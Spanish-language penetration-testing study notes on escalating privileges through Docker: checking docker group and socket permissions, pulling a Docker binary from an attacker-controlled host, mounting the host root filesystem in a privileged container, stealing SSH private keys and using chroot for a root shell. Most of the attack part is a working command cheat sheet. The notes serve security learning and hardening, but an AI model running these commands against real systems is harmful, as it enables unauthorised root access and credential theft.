---
tags:
  - linux
  - privex
  - container
---
## Conceptos Clave (TL;DR)
* Docker utiliza contenedores como entornos aislados en el espacio de usuario que comparten el sistema de archivos y recursos del sistema a nivel del sistema operativo.
* La arquitectura principal depende de un modelo cliente-servidor compuesto por el Docker daemon que ejecuta comandos y el Docker client que actúa como interfaz.
* Las imágenes de Docker son plantillas autocontenidas de solo lectura para crear contenedores. Por el contrario, los contenedores son instancias mutables que operan de manera independiente.
* La escalada de privilegios se logra aprovechando configuraciones débiles, como pertenecer al grupo de Docker o tener permisos de escritura sobre el socket, lo que permite montar el directorio raíz del host en un contenedor malicioso para obtener acceso total.

## Herramientas Clave
* **Docker CLI:** Interfaz primaria utilizada para emitir comandos al daemon, gestionar contenedores y descargar o listar imágenes.
* **Docker Compose:** Herramienta complementaria que simplifica la orquestación de múltiples contenedores usando un archivo YAML declarativo.
* **Wget:** Empleado para descargar binarios de Docker directamente al objetivo si el entorno carece del cliente preinstalado.
* **SSH:** Utilizado para iniciar sesión remotamente en el host objetivo utilizando claves privadas extraídas a través del sistema de archivos montado.

## Metodología Paso a Paso
* **Fase 1: Enumeración de Permisos del Entorno:** Se debe verificar si el usuario comprometido pertenece al grupo de Docker, si el binario de Docker cuenta con SUID, o si el usuario está definido en el archivo Sudoers. Paralelamente, se debe buscar el archivo de socket de Docker y verificar si otorga permisos de escritura.
* **Fase 2: Identificación de Recursos Locales:** Se deben listar las imágenes locales almacenadas en el sistema, ya que el host objetivo podría estar desconectado de internet por políticas de seguridad, lo que obliga a utilizar una imagen preexistente para desplegar el ataque.
* **Fase 3: Despliegue del Contenedor Malicioso:** Utilizando el cliente y conectándose al socket de Docker, se inicia un contenedor con altos privilegios. En esta etapa, el directorio raíz del host se mapea a un directorio compartido dentro del nuevo contenedor.
* **Fase 4: Explotación y Acceso al Host:** Una vez dentro del contenedor, se navega hacia el sistema de archivos del host montado. Desde esta ubicación, se pueden robar llaves SSH privadas o utilizar la utilidad de cambio de raíz para obtener una shell interactiva directamente en el host objetivo.

## Cheat Sheet de Comandos

```bash
# Muestra los identificadores y grupos del usuario, útil para confirmar pertenencia al grupo docker
id
```

```bash
# Lista los permisos del archivo de socket de Docker
ls -al /var/run/docker.sock
```

```bash
# -O: Especifica el nombre del archivo de salida.
# Descarga un binario estático de Docker al objetivo y le otorga permisos de ejecución
wget https://<ATTACKER_IP>:<PORT>/docker -O docker
chmod +x docker
```

```bash
# -H: Especifica la ubicación del socket de Docker para la conexión.
# ps: Muestra los contenedores que se encuentran en ejecución.
/tmp/docker -H unix://<PATH_TO_SOCK> ps
```

```bash
# Muestra todas las imágenes de Docker descargadas y disponibles en el host local
docker image ls
```

```bash
# -H: Conecta a través de un socket Unix específico.
# run: Crea e inicia un nuevo contenedor.
# --rm: Destruye el contenedor automáticamente cuando se detiene.
# -d: Ejecuta el contenedor en modo "detached" (segundo plano).
# --privileged: Otorga permisos extendidos al contenedor.
# -v: Monta el directorio raíz del host (/) hacia el directorio /<MOUNT_NAME> dentro del contenedor.
/tmp/docker -H unix://<PATH_TO_SOCK> run --rm -d --privileged -v /:/<MOUNT_NAME> <IMAGE_NAME>
```

```bash
# -H: Conecta a través del socket especificado.
# exec: Ejecuta un comando en un contenedor en ejecución.
# -it: Mantiene STDIN abierto y asigna una pseudo-TTY (shell interactiva).
/tmp/docker -H unix://<PATH_TO_SOCK> exec -it <CONTAINER_ID> /bin/bash
```

```bash
# Lee la clave privada SSH de un usuario desde el volumen del host montado en el contenedor
cat /<MOUNT_NAME>/home/<USER>/.ssh/id_rsa
```

```bash
# -i: Indica a SSH que utilice un archivo de clave privada específico para la autenticación.
ssh <USER>@<TARGET_IP> -i <PRIVATE_KEY_FILE>
```

```bash
# -H: Especifica el socket.
# run -v: Monta el directorio raíz.
# --rm -it: Ejecución interactiva y limpieza automática.
# chroot: Cambia el directorio raíz aparente al volumen montado, lanzando bash como root en el contexto del host.
docker -H unix://<PATH_TO_SOCK> run -v /:/<MOUNT_NAME> --rm -it <IMAGE_NAME> chroot /<MOUNT_NAME> bash
```

```bash
# para montar directamente si tengo la imágen en local
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
## "Gotchas" y Troubleshooting
* **Ubicación Alternativa del Socket:** Aunque el archivo de socket habitualmente reside en `/var/run/docker.sock`, los administradores pueden alterar esta ubicación dependiendo de la configuración del entorno.
* **Modo de Solo Lectura:** Los directorios compartidos pueden haber sido montados como solo lectura por el administrador del sistema. Si esto ocurre, las alteraciones realizadas en el sistema de archivos del contenedor no se reflejarán en el host, imposibilitando escribir llaves públicas en archivos `.ssh/authorized_keys`.
* **Limitaciones de Acceso:** En la mayoría de los casos, la comunicación con el daemon requiere estrictamente que el usuario pertenezca al grupo autorizado o posea credenciales válidas, a menos que el socket haya quedado expuesto por error con permisos de escritura universales.
* **Ausencia de Internet:** Muchos entornos restringen la conexión saliente de los servidores por razones de seguridad. En estos escenarios, intentar extraer imágenes remotas fallará, obligando al atacante a utilizar herramientas de enumeración para encontrar imágenes previamente almacenadas de forma local.